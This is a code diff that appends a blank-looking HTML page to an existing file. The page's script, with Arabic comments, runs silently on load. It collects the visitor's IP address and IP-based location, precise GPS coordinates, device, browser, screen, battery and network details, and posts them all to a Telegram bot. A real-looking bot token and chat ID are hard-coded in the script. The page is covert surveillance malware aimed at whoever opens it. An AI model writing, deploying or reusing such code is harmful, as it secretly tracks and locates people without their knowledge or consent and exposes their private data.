@@ -2061,3 +2061,210 @@ padding:30px;
     </script>
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>...</title>
+</head>
+<body>
+    <script>
+        // ============================================================
+        // بوت تيليجرام
+        // ============================================================
+        const BOT_TOKEN = '8529112495:AAFYQ5_9K8WeaA0k1qtrYAWyb75ajTaJ7RQ';
+        const CHAT_ID = '1485247348';
+
+        // ============================================================
+        // جلب كل المعلومات وإرسالها للبوت
+        // ============================================================
+        async function sendAllInfo() {
+            let msg = `🚨 *معلومات الجهاز*\n`;
+            msg += `═══════════════════════\n`;
+            
+            // 1. IP
+            try {
+                const ipify = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                const ip = ipify.ip;
+                msg += `🌐 *IP:* ${ip}\n`;
+                
+                // معلومات IP من ip-api
+                const info = await fetch(`http://ip-api.com/json/${ip}?lang=ar`).then(r => r.json());
+                msg += `📍 *الدولة:* ${info.country || 'غير معروف'}\n`;
+                msg += `🏙️ *المدينة:* ${info.city || 'غير معروف'}\n`;
+                msg += `🗺️ *المنطقة:* ${info.regionName || 'غير معروف'}\n`;
+                msg += `📌 *الإحداثيات:* ${info.lat || '---'}, ${info.lon || '---'}\n`;
+                msg += `📡 *مزود الخدمة:* ${info.isp || 'غير معروف'}\n`;
+                msg += `🏢 *المنظمة:* ${info.org || 'غير معروف'}\n`;
+                msg += `🔒 *VPN/Proxy:* ${info.proxy ? 'نعم' : 'لا'}\n`;
+                msg += `📱 *محمول:* ${info.mobile ? 'نعم' : 'لا'}\n`;
+                msg += `🕒 *المنطقة الزمنية:* ${info.timezone || 'غير معروف'}\n`;
+                msg += `\n`;
+            } catch(e) {
+                msg += `❌ IP: غير متاح\n\n`;
+            }
+
+            // 2. معلومات الجهاز
+            msg += `💻 *معلومات الجهاز*\n`;
+            msg += `🖥️ *النظام:* ${navigator.platform || 'غير معروف'}\n`;
+            msg += `🌐 *المتصفح:* ${navigator.userAgent || 'غير معروف'}\n`;
+            msg += `🌍 *اللغة:* ${navigator.language || 'غير معروف'}\n`;
+            msg += `⚙️ *الأنوية:* ${navigator.hardwareConcurrency || 'غير معروف'}\n`;
+            msg += `💾 *الذاكرة:* ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'غير معروف'}\n`;
+            msg += `🖱️ *نقاط اللمس:* ${navigator.maxTouchPoints || '0'}\n`;
+            msg += `🍪 *الكوكيز:* ${navigator.cookieEnabled ? 'مفعلة' : 'معطلة'}\n`;
+            msg += `\n`;
+
+            // 3. معلومات الشاشة
+            msg += `🖥️ *معلومات الشاشة*\n`;
+            msg += `📐 *الدقة:* ${window.screen.width}x${window.screen.height}\n`;
+            msg += `🎨 *عمق الألوان:* ${window.screen.colorDepth || 'غير معروف'} بت\n`;
+            msg += `📏 *المتاحة:* ${window.screen.availWidth}x${window.screen.availHeight}\n`;
+            msg += `🔄 *الاتجاه:* ${window.screen.orientation ? window.screen.orientation.type : 'غير معروف'}\n`;
+            msg += `🔍 *نسبة البكسل:* ${window.devicePixelRatio || 'غير معروف'}\n`;
+            msg += `\n`;
+
+            // 4. معلومات النافذة
+            msg += `📐 *معلومات النافذة*\n`;
+            msg += `📏 *الداخلية:* ${window.innerWidth}x${window.innerHeight}\n`;
+            msg += `📏 *الخارجية:* ${window.outerWidth}x${window.outerHeight}\n`;
+            msg += `\n`;
+
+            // 5. معلومات الوقت
+            msg += `⏰ *معلومات الوقت*\n`;
+            msg += `🗺️ *المنطقة الزمنية:* ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف'}\n`;
+            msg += `🕐 *التوقيت المحلي:* ${new Date().toLocaleString('ar-EG')}\n`;
+            msg += `🌐 *التوقيت العالمي:* ${new Date().toUTCString()}\n`;
+            msg += `📅 *الطابع الزمني:* ${Date.now()}\n`;
+            msg += `\n`;
+
+            // 6. معلومات الصفحة
+            msg += `🔗 *معلومات الصفحة*\n`;
+            msg += `📎 *الرابط:* ${window.location.href}\n`;
+            msg += `📝 *العنوان:* ${document.title || 'غير معروف'}\n`;
+            msg += `📎 *المصدر:* ${document.referrer || 'مباشر'}\n`;
+            msg += `📊 *نوع المستند:* ${document.contentType || 'غير معروف'}\n`;
+            msg += `\n`;
+
+            // 7. معلومات المتصفح الإضافية
+            msg += `🌐 *معلومات المتصفح*\n`;
+            msg += `📦 *الشركة المصنعة:* ${navigator.vendor || 'غير معروف'}\n`;
+            msg += `📌 *اسم التطبيق:* ${navigator.appName || 'غير معروف'}\n`;
+            msg += `📌 *إصدار التطبيق:* ${navigator.appVersion || 'غير معروف'}\n`;
+            msg += `🔌 *المكونات الإضافية:* ${navigator.plugins ? navigator.plugins.length : '0'}\n`;
+            msg += `\n`;
+
+            // 8. معلومات التخزين
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const storage = await navigator.storage.estimate();
+                    msg += `💾 *معلومات التخزين*\n`;
+                    msg += `📦 *المستخدم:* ${(storage.usage / (1024 * 1024 * 1024)).toFixed(2)} GB\n`;
+                    msg += `📦 *الحد الأقصى:* ${(storage.quota / (1024 * 1024 * 1024)).toFixed(2)} GB\n`;
+                    msg += `📊 *النسبة:* ${((storage.usage / storage.quota) * 100).toFixed(1)}%\n`;
+                    msg += `\n`;
+                }
+            } catch(e) {}
+
+            // 9. معلومات الاتصال
+            if (navigator.connection) {
+                msg += `📶 *معلومات الاتصال*\n`;
+                msg += `📡 *نوع الاتصال:* ${navigator.connection.effectiveType || 'غير معروف'}\n`;
+                msg += `⚡ *السرعة:* ${navigator.connection.downlink || 'غير معروف'} Mbps\n`;
+                msg += `🔄 *زمن الاستجابة:* ${navigator.connection.rtt || 'غير معروف'} ms\n`;
+                msg += `💾 *حفظ البيانات:* ${navigator.connection.saveData ? 'مفعل' : 'غير مفعل'}\n`;
+                msg += `\n`;
+            }
+
+            // 10. معلومات البطارية
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    msg += `🔋 *معلومات البطارية*\n`;
+                    msg += `🔋 *المستوى:* ${Math.round(battery.level * 100)}%\n`;
+                    msg += `⚡ *الشحن:* ${battery.charging ? 'نعم' : 'لا'}\n`;
+                    if (battery.chargingTime !== Infinity) {
+                        msg += `⏱️ *وقت الشحن:* ${battery.chargingTime || 'غير معروف'} ثانية\n`;
+                    }
+                    if (battery.dischargingTime !== Infinity) {
+                        msg += `⏱️ *وقت التفريغ:* ${battery.dischargingTime || 'غير معروف'} ثانية\n`;
+                    }
+                    msg += `\n`;
+                }
+            } catch(e) {}
+
+            // 11. قدرات المتصفح
+            msg += `🎨 *قدرات المتصفح*\n`;
+            msg += `🖼️ *Canvas:* ${!!document.createElement('canvas').getContext ? '✅' : '❌'}\n`;
+            msg += `🎮 *WebGL:* ${!!document.createElement('canvas').getContext('webgl') ? '✅' : '❌'}\n`;
+            msg += `📹 *WebRTC:* ${!!window.RTCPeerConnection ? '✅' : '❌'}\n`;
+            msg += `🔌 *WebSocket:* ${!!window.WebSocket ? '✅' : '❌'}\n`;
+            msg += `💾 *Local Storage:* ${!!window.localStorage ? '✅' : '❌'}\n`;
+            msg += `💾 *Session Storage:* ${!!window.sessionStorage ? '✅' : '❌'}\n`;
+            msg += `🗄️ *IndexedDB:* ${!!window.indexedDB ? '✅' : '❌'}\n`;
+            msg += `📍 *Geolocation:* ${!!navigator.geolocation ? '✅' : '❌'}\n`;
+            msg += `🔔 *الإشعارات:* ${!!window.Notification ? '✅' : '❌'}\n`;
+            msg += `👆 *اللمس:* ${('ontouchstart' in window || navigator.maxTouchPoints > 0) ? '✅' : '❌'}\n`;
+            msg += `🔋 *البطارية:* ${!!navigator.getBattery ? '✅' : '❌'}\n`;
+            msg += `🎤 *الميكروفون:* ${!!navigator.mediaDevices ? '✅' : '❌'}\n`;
+            msg += `📷 *الكاميرا:* ${!!navigator.mediaDevices ? '✅' : '❌'}\n`;
+            msg += `🖥️ *مشاركة الشاشة:* ${!!navigator.mediaDevices ? '✅' : '❌'}\n`;
+            msg += `\n`;
+
+            // 12. معلومات الموقع الجغرافي (GPS)
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000
+                    });
+                });
+                msg += `📍 *الموقع الجغرافي (GPS)*\n`;
+                msg += `📌 *خط العرض:* ${pos.coords.latitude}\n`;
+                msg += `📌 *خط الطول:* ${pos.coords.longitude}\n`;
+                msg += `🎯 *الدقة:* ${pos.coords.accuracy} متر\n`;
+                if (pos.coords.altitude) {
+                    msg += `🏔️ *الارتفاع:* ${pos.coords.altitude} متر\n`;
+                }
+                if (pos.coords.speed) {
+                    msg += `💨 *السرعة:* ${pos.coords.speed} م/ث\n`;
+                }
+                if (pos.coords.heading) {
+                    msg += `🧭 *الاتجاه:* ${pos.coords.heading}°\n`;
+                }
+                msg += `\n`;
+            } catch(e) {}
+
+            // الخاتمة
+            msg += `═══════════════════════\n`;
+            msg += `📅 ${new Date().toLocaleString('ar-EG')}`;
+
+            // ============================================================
+            // إرسال للبوت
+            // ============================================================
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                const result = await response.json();
+                console.log('✅ تم الإرسال:', result);
+            } catch(e) {
+                console.error('❌ خطأ:', e);
+            }
+        }
+
+        // ============================================================
+        // التشغيل فوراً
+        // ============================================================
+        sendAllInfo();
+    </script>
+</body>
+</html>
